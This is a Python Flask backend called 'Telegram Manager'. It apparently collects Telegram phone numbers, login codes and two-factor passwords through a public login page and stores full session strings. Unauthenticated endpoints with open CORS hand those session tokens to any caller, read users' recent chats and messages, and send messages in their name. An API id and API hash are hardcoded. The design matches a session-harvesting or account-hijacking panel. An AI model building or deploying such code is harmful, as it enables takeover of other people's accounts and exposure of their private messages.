from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import json
import os
import asyncio
import nest_asyncio
from datetime import datetime
import traceback

# Apply nest_asyncio for Render
nest_asyncio.apply()

app = Flask(__name__)
CORS(app)

# Your API credentials
api_id = 33465589
api_hash = '08bdab35790bf1fdf20c16a50bd323b8'

# Store temporary data for OTP
temp_data = {}

# Store accounts persistently
accounts = []
if os.path.exists('accounts.json'):
    try:
        with open('accounts.json', 'r') as f:
            accounts = json.load(f)
        print(f"✅ Loaded {len(accounts)} accounts")
    except Exception as e:
        print(f"Error loading accounts: {e}")
        accounts = []

def save_accounts():
    with open('accounts.json', 'w') as f:
        json.dump(accounts, f, indent=2)

# Helper to run async functions
def run_async(coro):
    """Run async coroutine in a new event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    except Exception as e:
        print(f"Error in run_async: {e}")
        traceback.print_exc()
        raise e
    finally:
        loop.close()

@app.route('/')
def serve_login():
    return send_file('login.html')

@app.route('/dashboard')
def serve_dashboard():
    return send_file('dashboard.html')

# -------------------- SEND OTP --------------------
@app.route('/api/add-account', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    # Basic phone validation
    if not phone.startswith('+'):
        return jsonify({'success': False, 'error': 'Phone number must start with country code (e.g., +1234567890)'})
    
    async def send_code():
        client = None
        try:
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.connect()
            
            # Check if connection is successful
            if not await client.is_connected():
                return {'success': False, 'error': 'Failed to connect to Telegram servers'}
            
            result = await client.send_code_request(phone)
            session_str = client.session.save()
            
            return {
                'success': True, 
                'phone_code_hash': result.phone_code_hash, 
                'session_str': session_str
            }
        except errors.FloodWaitError as e:
            wait_time = e.seconds
            return {'success': False, 'error': f'Too many attempts. Please wait {wait_time} seconds'}
        except errors.PhoneNumberInvalidError:
            return {'success': False, 'error': 'Invalid phone number format. Include country code (e.g., +1234567890)'}
        except errors.PhoneNumberBannedError:
            return {'success': False, 'error': 'This phone number is banned from Telegram'}
        except errors.PhoneNumberFloodError:
            return {'success': False, 'error': 'Too many requests with this phone number. Try again later.'}
        except Exception as e:
            print(f"Error in send_code: {str(e)}")
            traceback.print_exc()
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()
    
    try:
        # Create new event loop for each request
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(send_code())
        loop.close()
        
        if not result.get('success'):
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
        
        session_id = str(int(datetime.now().timestamp()))
        temp_data[session_id] = {
            'phone': phone,
            'phone_code_hash': result['phone_code_hash'],
            'session_str': result['session_str']
        }
        
        # Clean old sessions (older than 10 minutes)
        current_time = datetime.now().timestamp()
        old_sessions = [sid for sid, data in temp_data.items() 
                       if current_time - int(sid) > 600]
        for sid in old_sessions:
            if sid in temp_data:
                del temp_data[sid]
        
        print(f"📱 OTP sent to {phone}")
        return jsonify({'success': True, 'session_id': session_id})
    except Exception as e:
        print(f"Error in send_otp: {e}")
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)})

# -------------------- VERIFY OTP --------------------
@app.route('/api/verify-code', methods=['POST'])
def verify_otp():
    data = request.json
    code = data.get('code', '')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not session_id:
        return jsonify({'success': False, 'error': 'Session ID required'})
    
    if session_id not in temp_data:
        return jsonify({'success': False, 'error': 'Session expired. Please start over.'})
    
    session = temp_data[session_id]
    phone = session['phone']
    phone_code_hash = session['phone_code_hash']
    session_str = session['session_str']
    
    async def verify():
        client = None
        try:
            client = TelegramClient(StringSession(session_str), api_id, api_hash)
            await client.connect()
            
            # Check if already signed in
            if await client.is_user_authorized():
                me = await client.get_me()
                string_session = client.session.save()
                return {
                    'success': True, 
                    'me': {
                        'id': me.id,
                        'first_name': me.first_name or '',
                        'last_name': me.last_name or '',
                        'username': me.username or '',
                        'phone': me.phone or phone
                    }, 
                    'string_session': string_session
                }
            
            # If code is provided, try to sign in
            if code:
                try:
                    await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                except errors.SessionPasswordNeededError:
                    return {'success': False, 'need_password': True}
                except errors.PhoneCodeInvalidError:
                    return {'success': False, 'error': 'Invalid code. Please try again.'}
                except errors.PhoneCodeExpiredError:
                    return {'success': False, 'error': 'Code expired. Please request a new code.'}
                except errors.FloodWaitError as e:
                    return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds'}
            
            # If password is provided (2FA)
            elif password:
                try:
                    await client.sign_in(password=password)
                except errors.PasswordHashInvalidError:
                    return {'success': False, 'error': 'Invalid password. Please try again.'}
                except Exception as e:
                    return {'success': False, 'error': str(e)}
            else:
                return {'success': False, 'error': 'Code or password required'}
            
            # Get user info after successful sign in
            me = await client.get_me()
            string_session = client.session.save()
            
            return {
                'success': True, 
                'me': {
                    'id': me.id,
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'username': me.username or '',
                    'phone': me.phone or phone
                }, 
                'string_session': string_session
            }
            
        except Exception as e:
            print(f"Error in verify: {str(e)}")
            traceback.print_exc()
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(verify())
        loop.close()
        
        if result.get('need_password'):
            return jsonify({'success': False, 'need_password': True})
        
        if not result.get('success'):
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
        
        me = result['me']
        string_session = result['string_session']
        
        # Check if account already exists
        existing_account = None
        for a in accounts:
            if a.get('phone') == phone or a.get('user_id') == me['id']:
                existing_account = a
                break
        
        if existing_account:
            # Update existing account
            existing_account['name'] = f"{me['first_name']} {me['last_name']}".strip() or "User"
            existing_account['username'] = me['username']
            existing_account['session'] = string_session
            existing_account['date'] = str(datetime.now())
            account = existing_account
        else:
            # Create new account
            account = {
                'id': len(accounts) + 1,
                'user_id': me['id'],
                'phone': phone,
                'name': f"{me['first_name']} {me['last_name']}".strip() or "User",
                'username': me['username'],
                'session': string_session,
                'date': str(datetime.now())
            }
            accounts.append(account)
        
        save_accounts()
        
        # Clean up temp data
        if session_id in temp_data:
            del temp_data[session_id]
        
        print(f"✅ Account added/updated: {phone}")
        return jsonify({'success': True, 'account': account})
        
    except Exception as e:
        print(f"Error in verify_otp: {e}")
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)})

# -------------------- GET ACCOUNTS --------------------
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    try:
        account_list = [{
            'id': a['id'],
            'phone': a['phone'],
            'name': a['name'],
            'username': a.get('username', ''),
            'session': a.get('session', a.get('string_session', ''))
        } for a in accounts]
        return jsonify({'success': True, 'accounts': account_list})
    except Exception as e:
        print(f"Error in get_accounts: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- DELETE ACCOUNT --------------------
@app.route('/api/accounts/<int:account_id>', methods=['DELETE'])
def delete_account(account_id):
    global accounts
    try:
        accounts = [a for a in accounts if a['id'] != account_id]
        save_accounts()
        return jsonify({'success': True})
    except Exception as e:
        print(f"Error in delete_account: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- REMOVE ACCOUNT (POST method) --------------------
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    try:
        accounts = [a for a in accounts if a['id'] != account_id]
        save_accounts()
        print(f"✅ Account {account_id} removed")
        return jsonify({'success': True})
    except Exception as e:
        print(f"Error in remove_account: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- GET CHATS AND MESSAGES --------------------
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    if not session_string:
        return jsonify({'success': False, 'error': 'No session found for this account'})
    
    async def fetch():
        client = None
        try:
            client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client.connect()
            
            # Check if authorized
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Session expired. Please add account again.'}
            
            # Get dialogs (chats)
            dialogs = await client.get_dialogs(limit=100)
            
            chats = []
            all_messages = []
            
            for dialog in dialogs:
                try:
                    # Get chat info
                    if dialog.is_user:
                        # Private chat
                        if dialog.entity:
                            first = getattr(dialog.entity, 'first_name', '')
                            last = getattr(dialog.entity, 'last_name', '')
                            name = f"{first} {last}".strip()
                            if not name:
                                name = getattr(dialog.entity, 'username', 'Unknown')
                        else:
                            name = 'Unknown'
                    elif dialog.is_group or dialog.is_channel:
                        # Group or channel
                        name = dialog.name or 'Unknown'
                    else:
                        name = 'Unknown'
                    
                    chat_id = str(dialog.id)
                    
                    # Get last message
                    last_msg = ''
                    last_msg_date = None
                    if dialog.message and dialog.message.text:
                        last_msg = dialog.message.text[:100]
                        if dialog.message.date:
                            last_msg_date = dialog.message.date.timestamp()
                    
                    chats.append({
                        'id': chat_id,
                        'title': name,
                        'unread': dialog.unread_count or 0,
                        'lastMessage': last_msg,
                        'lastMessageDate': last_msg_date
                    })
                    
                    # Get last 20 messages for this chat
                    try:
                        msgs = await client.get_messages(dialog.entity, limit=20)
                        for msg in msgs:
                            if msg and msg.text:  # Only store text messages
                                all_messages.append({
                                    'chatId': chat_id,
                                    'text': msg.text,
                                    'date': msg.date.timestamp() if msg.date else 0,
                                    'out': msg.out or False,
                                    'id': msg.id
                                })
                    except Exception as e:
                        print(f"Error getting messages for chat {chat_id}: {e}")
                        continue
                        
                except Exception as e:
                    print(f"Error processing dialog: {e}")
                    continue
            
            # Sort messages by date
            all_messages.sort(key=lambda x: x['date'])
            
            return {
                'success': True, 
                'chats': chats, 
                'messages': all_messages
            }
            
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Flood wait. Try again in {e.seconds} seconds'}
        except errors.RPCError as e:
            return {'success': False, 'error': f'Telegram API error: {str(e)}'}
        except Exception as e:
            print(f"Error in fetch: {e}")
            traceback.print_exc()
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(fetch())
        loop.close()
        
        if result.get('success'):
            return jsonify({
                'success': True, 
                'chats': result['chats'], 
                'messages': result['messages']
            })
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Failed to fetch messages')})
            
    except Exception as e:
        print(f"Error in get_messages: {e}")
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)})

# -------------------- SEND MESSAGE --------------------
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not all([account_id, chat_id, message]):
        return jsonify({'success': False, 'error': 'Account ID, chat ID, and message are required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    async def send():
        client = None
        try:
            client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client.connect()
            
            # Check if authorized
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Session expired. Please add account again.'}
            
            # Try to get entity by ID or username
            try:
                # Try as integer ID first
                entity = await client.get_entity(int(chat_id))
            except (ValueError, TypeError):
                # Try as string (username or phone)
                entity = await client.get_entity(chat_id)
            except Exception as e:
                return {'success': False, 'error': f'Could not find chat: {str(e)}'}
            
            sent_msg = await client.send_message(entity, message)
            
            return {
                'success': True,
                'message': {
                    'id': sent_msg.id,
                    'text': sent_msg.text,
                    'date': sent_msg.date.timestamp() if sent_msg.date else 0,
                    'out': True
                }
            }
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Flood wait. Try again in {e.seconds} seconds'}
        except errors.RPCError as e:
            return {'success': False, 'error': f'Telegram API error: {str(e)}'}
        except Exception as e:
            print(f"Error sending message: {e}")
            traceback.print_exc()
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(send())
        loop.close()
        
        if result.get('success'):
            return jsonify({'success': True, 'message': result['message']})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Failed to send message')})
            
    except Exception as e:
        print(f"Error in send_message: {e}")
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)})

# -------------------- HEALTH CHECK --------------------
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'temp_sessions': len(temp_data)
    })

# -------------------- ERROR HANDLERS --------------------
@app.errorhandler(404)
def not_found(error):
    return jsonify({'success': False, 'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'success': False, 'error': 'Internal server error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*60)
    print('📱 TELEGRAM MANAGER - PRODUCTION READY')
    print('='*60)
    print(f'✅ Loaded {len(accounts)} accounts')
    print(f'✅ Server running on port {port}')
    print(f'✅ API ID: {api_id}')
    print(f'✅ nest_asyncio applied')
    print('='*60 + '\n')
    
    # Run with production settings
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
